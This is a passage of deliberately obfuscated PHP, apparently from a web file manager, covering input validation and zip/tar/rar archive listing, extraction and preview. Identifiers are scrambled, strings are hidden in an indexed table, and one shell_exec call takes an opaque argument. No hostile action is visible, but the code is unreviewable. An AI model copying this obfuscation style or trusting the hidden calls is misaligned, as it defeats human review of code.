Øâô‹ê„[2015]); foreach ($b¯ó˜Íõõ„ as $B³ø¯ä…‹Ÿ => $bÛÂ—ç»×§) { header($B³ø¯ä…‹Ÿ . $d Øâô‹ê„[873] . $bÛÂ—ç»×§); } } protected function send($D™åö¿°Ó…) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $D™åö¿°Ó…); } protected final function dosTime($aÎË¯Í‰ç) { $b´•È½Ë‘õ =& $_SERVER[Î¿—”òá]; $c¸•ßÏ±ÊÃ = getdate($aÎË¯Í‰ç); if ($c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[1718]] < 1980) { $c¸•ßÏ±ÊÃ = array($b´•È½Ë‘õ[1718] => 1980, $b´•È½Ë‘õ[2016] => 1, $b´•È½Ë‘õ[2017] => 1, $b´•È½Ë‘õ[2018] => 0, $b´•È½Ë‘õ[2019] => 0, $b´•È½Ë‘õ[2020] => 0); } $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[1718]] -= 1980; return $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[1718]] << 25 | $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[2016]] << 21 | $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[2017]] << 16 | $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[2018]] << 11 | $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[2019]] << 5 | $c¸•ßÏ±ÊÃ[$b´•È½Ë‘õ[2020]] >> 1; } protected function packFields($bî»ˆêã¹â) { $f‡Øè·…ñ¾ =& $_SERVER[Î¿—”òá]; $fÖ…ù¥Ô¬ = $f‡Øè·…ñ¾[33]; $e†÷×è‰Ã½ = array(); foreach ($bî»ˆêã¹â as $cƒŸèµíóØ) { $fÖ…ù¥Ô¬ .= $cƒŸèµíóØ[0]; $e†÷×è‰Ã½[] = $cƒŸèµíóØ[1]; } array_unshift($e†÷×è‰Ã½, $fÖ…ù¥Ô¬); return call_user_func_array($f‡Øè·…ñ¾[2021], $e†÷×è‰Ã½); } protected function filterFilename($f‘â„ÚÁ…) { $BŞœ‡ù³ÆÍ =& $_SERVER[Î¿—”òá]; return str_replace(array($BŞœ‡ù³ÆÍ[93], $BŞœ‡ù³ÆÍ[4], $BŞœ‡ù³ÆÍ[176], $BŞœ‡ù³ÆÍ[69], $BŞœ‡ù³ÆÍ[113], $BŞœ‡ù³ÆÍ[918], $BŞœ‡ù³ÆÍ[921], $BŞœ‡ù³ÆÍ[271]), $BŞœ‡ù³ÆÍ[70], $f‘â„ÚÁ…); } } goto C¿“†»‡˜Š; EùÍ•çÆ£: if (!function_exists($_SERVER[Î¿—”òá][1868])) { function imagecreatefrombmp($cĞ¸ƒÊ³Ö—) { return ImageGdBMP::load($cĞ¸ƒÊ³Ö—); } } class Input { public static function getArray($d£ÕÌ‚‰‚‰) { goto Bø˜„«Ÿ·Å; dğŸ‘éÆ¾: $e®†ÈÑ‚Ì¦ = array(); $EÑÁß˜ãÅ‘ = LNG($b›‚¦ŠŒŒó[1869]); foreach ($d£ÕÌ‚‰‚‰ as $Dã±‰‚ÆŠ¼ => $A©­ŞÎŞß) { goto E¡âÕ‘ÙÒé; E¡âÕ‘ÙÒé: $cùí¥±‡»† = _get($A©­ŞÎŞß, $b›‚¦ŠŒŒó[1239], $EÑÁß˜ãÅ‘ . $b›‚¦ŠŒŒó[873] . $Dã±‰‚ÆŠ¼); $F†Æ÷å®ÏØ = $Dã±‰‚ÆŠ¼; if (isset($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1870]]) && $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1870]]) { $F†Æ÷å®ÏØ = $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1870]]; } goto CôåÅ·‰ÖÔ; féÃƒ–å: if (isset($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1872]]) && !self::check($in[$Dã±‰‚ÆŠ¼], $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1872]], $D¥ò’¨áê„)) { if (array_key_exists($b›‚¦ŠŒŒó[1871], $A©­ŞÎŞß)) { if (!is_null($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1871]])) { $f–ÇÈŠäï[$F†Æ÷å®ÏØ] = $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1871]]; } } else { $e®†ÈÑ‚Ì¦[] = $cùí¥±‡»†; } continue; } $f–ÇÈŠäï[$F†Æ÷å®ÏØ] = $in[$Dã±‰‚ÆŠ¼]; goto f¥‘»“ÄšÜ; CôåÅ·‰ÖÔ: if (!array_key_exists($Dã±‰‚ÆŠ¼, $in)) { if (array_key_exists($b›‚¦ŠŒŒó[1871], $A©­ŞÎŞß)) { if (!is_null($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1871]])) { $f–ÇÈŠäï[$F†Æ÷å®ÏØ] = $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1871]]; } } else { if (isset($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1872]])) { $e®†ÈÑ‚Ì¦[] = $cùí¥±‡»†; } } continue; } if (isset($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1872]]) && $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1872]] == $b›‚¦ŠŒŒó[282]) { $b™¤”–Î˜ = json_decode($in[$Dã±‰‚ÆŠ¼], !0); if (is_array($b™¤”–Î˜)) { $f–ÇÈŠäï[$F†Æ÷å®ÏØ] = $b™¤”–Î˜; } else { if (array_key_exists($b›‚¦ŠŒŒó[1871], $A©­ŞÎŞß)) { if (!is_null($A©­ŞÎŞß[$b›‚¦ŠŒŒó[1871]])) { $f–ÇÈŠäï[$F†Æ÷å®ÏØ] = $A©­ŞÎŞß[$b›‚¦ŠŒŒó[1871]]; } } else { $e®†ÈÑ‚Ì¦[] = $cùí¥±‡»†; } } continue; } $D¥ò’¨áê„ = _get($A©­ŞÎŞß, $b›‚¦ŠŒŒó[1005]); goto féÃƒ–å; f¥‘»“ÄšÜ: } goto f„ÆØÍö”™; f„ÆØÍö”™: if (count($e®†ÈÑ‚Ì¦) > 0) { show_json(implode($b›‚¦ŠŒŒó[1873], $e®†ÈÑ‚Ì¦), !1); } return $f–ÇÈŠäï; goto câÁëñ©; Bø˜„«Ÿ·Å: $b›‚¦ŠŒŒó =& $_SERVER[Î¿—”òá]; global $in; $f–ÇÈŠäï = array(); goto dğŸ‘éÆ¾; câÁëñ©: } public static function reg($Dâæ¬Ï–‡ê = "\162\x65\161\x75\x69\x72\x65") { static $EÖŠ¦¾¯Ö£ = array("\162\x65\161\x75\151\x72\x65" => "\x2e\x2b", "\x6e\x75\x6d\x62\145\x72" => "\134\144\53", "\150\145\170" => "\x5b\60\55\71\x41\x2d\106\141\55\146\135\53", "\151\x6e\164" => "\x5b\55\134\x2b\x5d\x3f\134\144\x2b", "\x62\x6f\157\x6c" => "\60\x7c\x31", "\x66\x6c\x6f\x61\x74" => "\x5b\x2d\134\53\x5d\77\134\x64\x2b\50\x5c\56\x5c\x64\x2b\51\77", "\145\156\x67\x6c\x69\163\x68" => "\x5b\101\x2d\x5a\x61\55\x7a\40\x5d\x2b", "\x63\150\x69\x6e\145\x73\x65" => "\x5b\x5c\170\173\64\x65\x30\60\x7d\x2d\x5c\170\173\x39\x66\x61\65\x7d\x5d\53", "\150\x61\x73\x43\150\x69\x6e\x65\x73\145" => "\x2f\x28\133\134\170\x7b\x34\x65\x30\x30\x7d\55\x5c\170\x7b\x39\146\x61\x35\x7d\135\53\x29\x2f\x75", "\145\x6d\x61\x69\154" => "\134\x77\53\50\x5b\x5c\56\134\x2d\135\x5c\x77\x2b\x29\x2a\x5c\x40\x5c\167\x2b\50\133\x5c\x2e\x5c\55\135\x5c\x77\53\51\52\134\x2e\x5c\167\x2b", "\160\x68\x6f\x6e\x65" => "\61\133\63\x2d\71\135\134\144\x7b\x39\175", "\164\x65\154\160\150\x6f\x6e\145" => "\50\134\x28\x5c\144\173\63\x2c\64\175\x5c\51\x7c\x5c\144\x7b\x33\54\x34\175\x2d\x7c\134\x73\x29\x3f\x5c\x64\173\67\54\x31\x34\175", "\x75\x72\154" => "\x28\x68\164\164\x70\174\146\x74\x70\x7c\x68\x74\164\160\x73\51\72\x5c\x2f\134\57\133\x5c\167\134\55\137\x5d\53\x28\x5c\56\x5b\x5c\167\x5c\55\x5f\135\53\x29\53\50\x5b\134\x77\134\55\x5c\x2e\x2c\x40\77\136\75\x25\46\72\x5c\57\176\134\x2b\43\135\x2a\133\134\167\x5c\55\x5c\100\77\x5e\75\x25\x26\x5c\x2f\176\134\x2b\x23\x5d\x29\x3f", "\x75\x72\x6c\x46\x75\x6c\154" => "\x5b\x61\55\x7a\101\55\172\135\x2b\72\x5c\x2f\x5c\x2f\x5b\136\134\x73\x5d\52", "\x69\x70" => "\x28\134\x64\173\x31\54\63\x7d\x5c\x2e\x29\x7b\63\175\x28\x5c\x64\173\x31\54\63\175\51", "\x7a\151\x70" => "\133\61\x2d\71\x5d\x5c\x64\x7b\65\x7d\50\x3f\41\x5c\x64\51", "\151\x64\103\x61\x72\144" => "\x28\134\144\173\x31\x35\x7d\x29\x7c\50\134\144\173\61\67\175\x28\x5c\x64\174\x58\174\x78\x29\x29", "\143\157\x6c\x6f\x72" => "\43\50\x5b\60\55\x39\x41\55\x46\x61\x2d\146\135\173\x33\x7d\174\133\60\55\x39\x41\x2d\x46\141\x2d\146\x5d\x7b\66\175\51", "\164\151\x6d\x65" => "\x28\133\x30\55\x31\x5d\134\144\174\62\133\x30\x2d\64\135\51\x3a\x5b\60\55\65\135\134\x64", "\144\x61\x74\145" => "\134\144\173\64\x7d\133\55\134\x2f\x5d\77\50\60\133\61\x2d\x39\x5d\x7c\61\133\60\55\62\x5d\51\133\x2d\x5c\57\135\x3f\50\133\x30\x2d\62\135\x5c\x64\x7c\x33\x5b\x30\55\x31\135\x29", "\x64\141\x74\x65\124\x69\155\x65" => "\134\x64\173\x34\x7d\133\55\x5c\57\135\x3f\x28\x30\133\61\55\x39\135\174\x31\133\60\55\x32\x5d\x29\x5b\x2d\134\x2f\x5d\77\x28\x5b\60\55\x32\135\x5c\x64\x7c\x33\133\60\x2d\x31\x5d\x29\x5c\163\53\x28\133\60\x2d\x31\135\x5c\144\x7c\x32\x5b\x30\55\64\x5d\51\x3a\133\x30\55\x35\135\134\x64", "\160\141\163\x73\167\157\x72\144" => "\50\77\75\x2e\x2a\x5c\x64\51\x28\x3f\x3d\56\52\133\x61\x2d\x7a\135\51\x28\x3f\x3d\x2e\52\133\x41\x2d\132\135\51\x2e\x7b\70\54\x32\x30\175", "\153\x65\171" => "\x5b\101\x2d\x5a\x61\55\172\60\55\x39\x5f\x5c\x2d\x5c\x2e\x5d\53", "\153\145\171\106\x75\154\x6c" => "\133\x41\x2d\x5a\x61\x2d\172\x30\x2d\71\x5f\134\x2d\134\56\x5c\163\54\x5d\53"); if (!$Dâæ¬Ï–‡ê) { return $EÖŠ¦¾¯Ö£; } return $EÖŠ¦¾¯Ö£[$Dâæ¬Ï–‡ê]; } public static function check($cŒ…Ëğ‘½„, $BŞåêĞŸ¾¼, $fò®ÅÈ˜¸‚ = null) { $aìµƒ†æ =& $_SERVER[Î¿—”òá]; switch ($BŞåêĞŸ¾¼) { case $aìµƒ†æ[7]: return in_array($cŒ…Ëğ‘½„, $fò®ÅÈ˜¸‚); break; case $aìµƒ†æ[1874]: return floatval($cŒ…Ëğ‘½„) > $fò®ÅÈ˜¸‚; break; case $aìµƒ†æ[1875]: return floatval($cŒ…Ëğ‘½„) < $fò®ÅÈ˜¸‚; break; case $aìµƒ†æ[325]: return strlen($cŒ…Ëğ‘½„) >= $fò®ÅÈ˜¸‚[0] && strlen($cŒ…Ëğ‘½„) <= $fò®ÅÈ˜¸‚[1]; break; case $aìµƒ†æ[325]: if (is_array($fò®ÅÈ˜¸‚)) { return strlen($cŒ…Ëğ‘½„) >= $fò®ÅÈ˜¸‚[0] && strlen($cŒ…Ëğ‘½„) <= $fò®ÅÈ˜¸‚[1]; break; } else { return strlen($cŒ…Ëğ‘½„) == $fò®ÅÈ˜¸‚; break; } case $aìµƒ†æ[321]: return floatval($cŒ…Ëğ‘½„) >= $fò®ÅÈ˜¸‚[0] && floatval($cŒ…Ëğ‘½„) <= $fò®ÅÈ˜¸‚[1]; break; } $C—àğñÄºˆ = self::reg(!1); $BŞåêĞŸ¾¼ = isset($C—àğñÄºˆ[$BŞåêĞŸ¾¼]) ? $C—àğñÄºˆ[$BŞåêĞŸ¾¼] : $BŞåêĞŸ¾¼; if (substr($BŞåêĞŸ¾¼, 0, 1) != $aìµƒ†æ[8]) { $BŞåêĞŸ¾¼ = $aìµƒ†æ[1876] . $BŞåêĞŸ¾¼ . $aìµƒ†æ[1877]; } return preg_match($BŞåêĞŸ¾¼, $cŒ…Ëğ‘½„) === 1; } public static function get($eËÄò£Ö´§, $eÕç¨‡¶Ÿ = null, $F·ÒÖğ¹‘‘ = null, $DŠ©’’Ì‘¡ = null) { goto FªˆÉÀ—Î; E†µÊ»§: if (!is_null($DŠ©’’Ì‘¡)) { $b¨®ôŠĞ›†[$B·ÆÊ‘„¾…[1005]] = $DŠ©’’Ì‘¡; } if (!is_null($eÕç¨‡¶Ÿ)) { $b¨®ôŠĞ›†[$B·ÆÊ‘„¾…[1872]] = $eÕç¨‡¶Ÿ; } $CĞ‚ÑßÅÑ— = Input::getArray(array($eËÄò£Ö´§ => $b¨®ôŠĞ›†)); goto f¾Ã‰„Õˆ“; FªˆÉÀ—Î: $B·ÆÊ‘„¾… =& $_SERVER[Î¿—”òá]; $b¨®ôŠĞ›† = array(); if (!is_null($F·ÒÖğ¹‘‘)) { $b¨®ôŠĞ›†[$B·ÆÊ‘„¾…[34]] = $F·ÒÖğ¹‘‘; } goto E†µÊ»§; f¾Ã‰„Õˆ“: return $CĞ‚ÑßÅÑ—[$eËÄò£Ö´§]; goto B›Ê½×İ¥½; B›Ê½×İ¥½: } } class KodArchive { static function init() { goto D÷Êè”¹ó; cÖ”ô¾®óˆ: define($A…ùêù¹ùñ[1880], TEMP_FILES); define($A…ùêù¹ùñ[1881], TEMP_FILES); define($A…ùêù¹ùñ[1882], $A…ùêù¹ùñ[1883]); goto e’çêÈ¼¬; b¥É²°¥±: require_once ARCHIVE_LIB . $A…ùêù¹ùñ[1889]; goto Cƒõ½é±¡–; fõ„²¾ƒÈ: require_once ARCHIVE_LIB . $A…ùêù¹ùñ[1886]; require_once ARCHIVE_LIB . $A…ùêù¹ùñ[1887]; require_once ARCHIVE_LIB . $A…ùêù¹ùñ[1888]; goto b¥É²°¥±; e’çêÈ¼¬: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $A…ùêù¹ùñ[1884]; require_once ARCHIVE_LIB . $A…ùêù¹ùñ[1885]; goto fõ„²¾ƒÈ; D÷Êè”¹ó: $A…ùêù¹ùñ =& $_SERVER[Î¿—”òá]; if (defined($A…ùêù¹ùñ[1878])) { return; } define($A…ùêù¹ùñ[1878], SDK_DIR . $A…ùêù¹ùñ[1879]); goto cÖ”ô¾®óˆ; Cƒõ½é±¡–: } static function checkIfType($Cˆˆ¾ˆŠ‚, $B‘“Î×â½Â) { goto c§¬‚Ú„¸ç; b„ ÷õªÎ½: $eîé¢¸“äö = in_array($Cˆˆ¾ˆŠ‚, $Bğ¶£ä„Ï[$B‘“Î×â½Â]); if ($eîé¢¸“äö && ($B‘“Î×â½Â == $Fêëø©óíß[301] || $B‘“Î×â½Â == $Fêëø©óíß[1893]) && (!function_exists($Fêëø©óíß[1901]) || !function_exists($Fêëø©óíß[1902]))) { show_tips($Fêëø©óíß[1903]); } if ($eîé¢¸“äö && $B‘“Î×â½Â == $Fêëø©óíß[1038] && (!function_exists($Fêëø©óíß[1904]) || !strstr(shell_exec($Fêëø©óíß[1905]), $Fêëø©óíß[1906]))) { show_tips($Fêëø©óíß[1907]); } goto fÔèšÇè·ç; fÔèšÇè·ç: return $eîé¢¸“äö; goto C„ÚË´Ï§‡; c§¬‚Ú„¸ç: $Fêëø©óíß =& $_SERVER[Î¿—”òá]; self::init(); $Bğ¶£ä„Ï = array($Fêëø©óíß[301] => array($Fêëø©óíß[301], $Fêëø©óíß[1890], $Fêëø©óíß[1891], $Fêëø©óíß[1892]), $Fêëø©óíß[1893] => array($Fêëø©óíß[1893], $Fêëø©óíß[1894], $Fêëø©óíß[1036], $Fêëø©óíß[1034]), $Fêëø©óíß[1038] => array($Fêëø©óíß[1038], $Fêëø©óíß[1895], $Fêëø©óíß[1896], $Fêëø©óíß[1897], $Fêëø©óíß[1898], $Fêëø©óíß[1899], $Fêëø©óíß[1900])); goto b„ ÷õªÎ½; C„ÚË´Ï§‡: } static function listContent($F´ ‰Á‰‹ğ, $FÜÜÈÅ¿È = true) { $b…Üš­ÛÁ‡ =& $_SERVER[Î¿—”òá]; self::init(); $eëÄÁùßŞÖ = !empty($GLOBALS[$b…Üš­ÛÁ‡[1042]]) ? $GLOBALS[$b…Üš­ÛÁ‡[1042]] : get_path_ext($F´ ‰Á‰‹ğ); $B¾ä¡Ñß†œ = !1; if (self::checkIfType($eëÄÁùßŞÖ, $b…Üš­ÛÁ‡[1893])) { $B˜¨‚Œ¦ = PclTarList($F´ ‰Á‰‹ğ, $eëÄÁùßŞÖ); $B¾ä¡Ñß†œ = array(); for ($A ÂµçËˆ» = 0; $A ÂµçËˆ» < count($B˜¨‚Œ¦); $A ÂµçËˆ»++) { $c°ñÅ¡¬“ = $B˜¨‚Œ¦[$A ÂµçËˆ»]; if ($c°ñÅ¡¬“[$b…Üš­ÛÁ‡[1908]] == $b…Üš­ÛÁ‡[1909] || $c°ñÅ¡¬“[$b…Üš­ÛÁ‡[1908]] == $b…Üš­ÛÁ‡[1910]) { continue; } if ($FÜÜÈÅ¿È) { $c°ñÅ¡¬“[$b…Üš­ÛÁ‡[1911]] = ltrim($c°ñÅ¡¬“[$b…Üš­ÛÁ‡[1911]], $b…Üš­ÛÁ‡[1148]); } if ($c°ñÅ¡¬“[$b…Üš­ÛÁ‡[1908]] == $b…Üš­ÛÁ‡[1912]) { $c°ñÅ¡¬“[$b…Üš­ÛÁ‡[76]] = !0; } else { $c°ñÅ¡¬“[$b…Üš­ÛÁ‡[76]] = !1; } $c°ñÅ¡¬“[$b…Üš­ÛÁ‡[1029]] = $A ÂµçËˆ»; $B¾ä¡Ñß†œ[] = $c°ñÅ¡¬“; } } else { if (self::checkIfType($eëÄÁùßŞÖ, $b…Üš­ÛÁ‡[1038])) { $e¤ƒ‚œ‘äÁ = kodRarArchive::listContent($F´ ‰Á‰‹ğ); if (!$e¤ƒ‚œ‘äÁ[$b…Üš­ÛÁ‡[1025]]) { return $e¤ƒ‚œ‘äÁ; } else { $B¾ä¡Ñß†œ = $e¤ƒ‚œ‘äÁ[$b…Üš­ÛÁ‡[1027]]; } } else { if (kodZipArchive::support($b…Üš­ÛÁ‡[354])) { $B¾ä¡Ñß†œ = kodZipArchive::listContent($F´ ‰Á‰‹ğ); } else { $CŞ“¢Ú§È = new PclZip($F´ ‰Á‰‹ğ); $B¾ä¡Ñß†œ = $CŞ“¢Ú§È->listContent(); } } } if ($B¾ä¡Ñß†œ) { $eÓ·á¤Ôè¿ = unzip_charset_get($B¾ä¡Ñß†œ); $FÜÜÈÅ¿È = $FÜÜÈÅ¿È && function_exists($b…Üš­ÛÁ‡[65]); for ($A ÂµçËˆ» = 0; $A ÂµçËˆ» < count($B¾ä¡Ñß†œ); $A ÂµçËˆ»++) { $B¾ä¡Ñß†œ[$A ÂµçËˆ»][$b…Üš­ÛÁ‡[1911]] = str_replace(array($b…Üš­ÛÁ‡[1065], $b…Üš­ÛÁ‡[1913]), $b…Üš­ÛÁ‡[760], $B¾ä¡Ñß†œ[$A ÂµçËˆ»][$b…Üš­ÛÁ‡[1911]]); if ($FÜÜÈÅ¿È) { $B¾ä¡Ñß†œ[$A ÂµçËˆ»][$b…Üš­ÛÁ‡[1911]] = iconv_to($B¾ä¡Ñß†œ[$A ÂµçËˆ»][$b…Üš­ÛÁ‡[1911]], $eÓ·á¤Ôè¿, $b…Üš­ÛÁ‡[326]); unset($B¾ä¡Ñß†œ[$A ÂµçËˆ»][$b…Üš­ÛÁ‡[1914]]); } } return array($b…Üš­ÛÁ‡[1025] => !0, $b…Üš­ÛÁ‡[1027] => $B¾ä¡Ñß†œ); } else { return array($b…Üš­ÛÁ‡[1025] => !1, $b…Üš­ÛÁ‡[1027] => $B¾ä¡Ñß†œ); } } static function extract($DÓ¢ô›œ×Ä, $cò……¸ù•, $c²Ö¾Ø£×¶ = "\x2d\x31", &$EÌØ¬¾º = false) { goto F‘Û§¢¸Î¨; b†¼‹‰„®Ã: if (self::checkIfType($bˆµÚÆ’ÔÍ, $FÛĞª’†—µ[1893])) { if ($c²Ö¾Ø£×¶ != $FÛĞª’†—µ[1024]) { $eáĞˆ÷øÑ¯ = unzip_pre_name($eáĞˆ÷øÑ¯); $BŒùœ´™³ = unzip_pre_name($BŒùœ´™³); $Dãƒµ·×®‰ = PclTarExtractList($DÓ¢ô›œ×Ä, array($eáĞˆ÷øÑ¯), $cò……¸ù•, $BŒùœ´™³, $bˆµÚÆ’ÔÍ); } else { $Dãƒµ·×®‰ = PclTarExtract($DÓ¢ô›œ×Ä, $cò……¸ù•, $FÛĞª’†—µ[361], $bˆµÚÆ’ÔÍ); } return array($FÛĞª’†—µ[1025] => $Dãƒµ·×®‰, $FÛĞª’†—µ[1027] => PclErrorString(!0)); } else { if (self::checkIfType($bˆµÚÆ’ÔÍ, $FÛĞª’†—µ[1038])) { return kodRarArchive::extract($DÓ¢ô›œ×Ä, $cò……¸ù•, $bˆµÚÆ’ÔÍ, $EÌØ¬¾º); } else { if (kodZipArchive::support($FÛĞª’†—µ[1915])) { return kodZipArchive::extract($DÓ¢ô›œ×Ä, $cò……¸ù•, $EÌØ¬¾º); } else { $aÊï÷“ïÍ² = new PclZip($DÓ¢ô›œ×Ä); if ($c²Ö¾Ø£×¶ != $FÛĞª’†—µ[1024]) { $Dãƒµ·×®‰ = $aÊï÷“ïÍ²->extract(PCLZIP_OPT_PATH, $cò……¸ù•, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $FÛĞª’†—µ[1916], PCLZIP_OPT_BY_NAME, $bæë÷ˆä«­[$FÛĞª’†—µ[1911]], PCLZIP_OPT_REMOVE_PATH, $BŒùœ´™³, PCLZIP_OPT_REPLACE_NEWER); } else { $Dãƒµ·×®‰ = $aÊï÷“ïÍ²->extract(PCLZIP_OPT_PATH, $cò……¸ù•, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $FÛĞª’†—µ[1916], PCLZIP_OPT_REPLACE_NEWER); } return array($FÛĞª’†—µ[1025] => $Dãƒµ·×®‰, $FÛĞª’†—µ[1027] => $aÊï÷“ïÍ²->errorName(!0)); } } } return array($FÛĞª’†—µ[1025] => !1, $FÛĞª’†—µ[1027] => $FÛĞª’†—µ[1917]); goto F†Ùõ„Ô•ø; F‘Û§¢¸Î¨: $FÛĞª’†—µ =& $_SERVER[Î¿—”òá]; self::init(); $bˆµÚÆ’ÔÍ = !empty($GLOBALS[$FÛĞª’†—µ[1042]]) ? $GLOBALS[$FÛĞª’†—µ[1042]] : get_path_ext($DÓ¢ô›œ×Ä); goto a„‡˜ß…ã; a„‡˜ß…ã: $Aâ¾î¾­òÄ = self::listContent($DÓ¢ô›œ×Ä, !1); if (!$Aâ¾î¾­òÄ[$FÛĞª’†—µ[1025]]) { return $Aâ¾î¾­òÄ; } if ($c²Ö¾Ø£×¶ != $FÛĞª’†—µ[1024]) { goto dÑÂÄ¯¢à; fÛ‘ÚÍ„¢: if ($GLOBALS[$FÛĞª’†—µ[6]][$FÛĞª’†—µ[1146]] != $FÛĞª’†—µ[326]) { $eáĞˆ÷øÑ¯ = unzip_pre_name($EÌØ¬¾º); } $BŒùœ´™³ = get_path_father($EÌØ¬¾º); if ($BŒùœ´™³ == $EÌØ¬¾º) { $BŒùœ´™³ = $FÛĞª’†—µ[33]; } goto eŞµªæ°–; eŞµªæ°–: if ($bæë÷ˆä«­[$FÛĞª’†—µ[76]]) { $eáĞˆ÷øÑ¯ = rtrim($eáĞˆ÷øÑ¯, $FÛĞª’†—µ[8]) . $FÛĞª’†—µ[8]; $EÌØ¬¾º = array($EÌØ¬¾º); } $cªÃì“× = str_replace($FÛĞª’†—µ[93], $FÛĞª’†—µ[8], $eáĞˆ÷øÑ¯); if (substr($cªÃì“×, -1) == $FÛĞª’†—µ[8]) { if (!strstr(trim($cªÃì“×, $FÛĞª’†—µ[8]), $FÛĞª’†—µ[8])) { $cò……¸ù• = $cò……¸ù• . get_path_this($cªÃì“×) . $FÛĞª’†—µ[8]; } } else { if ($BŒùœ´™³ == $eáĞˆ÷øÑ¯) { $BŒùœ´™³ = $FÛĞª’†—µ[33]; } } goto cÕõìáÀîÒ; dÑÂÄ¯¢à: $bæë÷ˆä«­ = self::fileIndex($Aâ¾î¾­òÄ[$FÛĞª’†—µ[1027]], $c²Ö¾Ø£×¶); $EÌØ¬¾º = str_replace(array($FÛĞª’†—µ[1065], $FÛĞª’†—µ[1913]), $FÛĞª’†—µ[70], $bæë÷ˆä«­[$FÛĞª’†—µ[1911]]); $eáĞˆ÷øÑ¯ = $EÌØ¬¾º; goto fÛ‘ÚÍ„¢; cÕõìáÀîÒ: } goto b†¼‹‰„®Ã; F†Ùõ„Ô•ø: } static function fileIndex($D„¹Ö©ÀÈ, $d„Œ²óÎ‘, $e¥Å–ØÛÁ˜ = false) { goto A‰”­§Ö¹; A‰”­§Ö¹: $D‚óÏĞ¡Ï =& $_SERVER[Î¿—”òá]; self::init(); if (!is_array($D„¹Ö©ÀÈ)) { return !1; } goto AŠ¬éùßñé; AŠ¬éùßñé: $f¿À“«× = count($D„¹Ö©ÀÈ); for ($aŠà·Š¯ƒ = 0; $aŠà·Š¯ƒ < $f¿À“«×; $aŠà·Š¯ƒ++) { if ($d„Œ²óÎ‘ == $D„¹Ö©ÀÈ[$aŠà·Š¯ƒ][$D‚óÏĞ¡Ï[1029]]) { $cŸÄ‰¤£Š† = $D„¹Ö©ÀÈ[$aŠà·Š¯ƒ]; break; } } if (!$cŸÄ‰¤£Š†) { show_tips($D‚óÏĞ¡Ï[1918]); } goto fƒØšŞÑÀ·; fƒØšŞÑÀ·: $D®öñ©çÃá = $cŸÄ‰¤£Š†; if ($e¥Å–ØÛÁ˜) { $D®öñ©çÃá = $cŸÄ‰¤£Š†[$e¥Å–ØÛÁ˜]; if ($cŸÄ‰¤£Š†[$D‚óÏĞ¡Ï[76]]) { $D®öñ©çÃá = rtrim($D®öñ©çÃá, $D‚óÏĞ¡Ï[8]) . $D‚óÏĞ¡Ï[8]; } } return $D®öñ©çÃá; goto bã‡®âßİŒ; bã‡®âßİŒ: } static function extractZipFile($d¢¼à‘ò•æ, $B¿Š¦—Ã‡, $EÄÕ¦ææĞ› = false) { goto C‰‡î³ˆ‰¾; dã°¹¨¸¢ß: mk_dir($C§ëºäÚœ¬); $bâ„ªÔÊÔ = $C§ëºäÚœ¬ . md5($d¢¼à‘ò•æ . $B¿Š¦—Ã‡); if ($EÄÕ¦ææĞ›) { $bâ„ªÔÊÔ = $C§ëºäÚœ¬ . $EÄÕ¦ææĞ›; } goto B½ êîŠ»Ä; eÆ°…èèŠÀ: if (!file_exists($AÈç·ñ’¥)) { return !1; } @rename($AÈç·ñ’¥, $bâ„ªÔÊÔ); return $bâ„ªÔÊÔ; goto f¼àÔ¶ËÓ…; B½ êîŠ»Ä: if (file_exists($bâ„ªÔÊÔ)) { return $bâ„ªÔÊÔ; } $aé†İ¯Æñ = new PclZip($d¢¼à‘ò•æ); $AÈç·ñ’¥ = unzip_filter_ext($C§ëºäÚœ¬ . get_path_this($B¿Š¦—Ã‡)); goto a·ƒ­“¹Ê×; a·ƒ­“¹Ê×: $Dñ‘×øò× = get_path_father($B¿Š¦—Ã‡); if ($Dñ‘×øò× == $B¿Š¦—Ã‡) { $Dñ‘×øò× = $BÃ¥«›ˆ©î[33]; } $CËò®Ã÷õ» = $aé†İ¯Æñ->extract(PCLZIP_OPT_PATH, $C§ëºäÚœ¬, PCLZIP_CB_PRE_FILE_NAME, $BÃ¥«›ˆ©î[1916], PCLZIP_OPT_REMOVE_PATH, $Dñ‘×øò×, PCLZIP_OPT_BY_NAME, $B¿Š¦—Ã‡); goto eÆ°…èèŠÀ; C‰‡î³ˆ‰¾: $BÃ¥«›ˆ©î =& $_SERVER[Î¿—”òá]; self::init(); $C§ëºäÚœ¬ = TEMP_FILES . hash_path($d¢¼à‘ò•æ) . $BÃ¥«›ˆ©î[8]; goto dã°¹¨¸¢ß; f¼àÔ¶ËÓ…: } static function filePreview($a²ÖÔ¡•³ˆ, $Fºà½ËĞÅ“, $F±”Øêç‰ = false, $FÅ¹ŸÈ’ŸÈ = false) { goto b¯”ÛôÒ˜ï; E ‹¡»ƒì˜: $FÂî’¸âáÂ = self::extract($a²ÖÔ¡•³ˆ, $B¶Ìäò¤È‰, $Fºà½ËĞÅ“, $eˆ½è®¡ĞÎ); if (is_array($eˆ½è®¡ĞÎ)) { show_json($bâáº‰¼è[1919], !1); } if (file_exists($b‡’÷»âÚ¦)) { IO::fileOut($b‡’÷»âÚ¦, $F±”Øêç‰, get_path_this($eˆ½è®¡ĞÎ)); return; } goto cÛ‚Œ»È†; eäµˆ‘óñ : if (!$FÂî’¸âáÂ[$bâáº‰¼è[1025]]) { 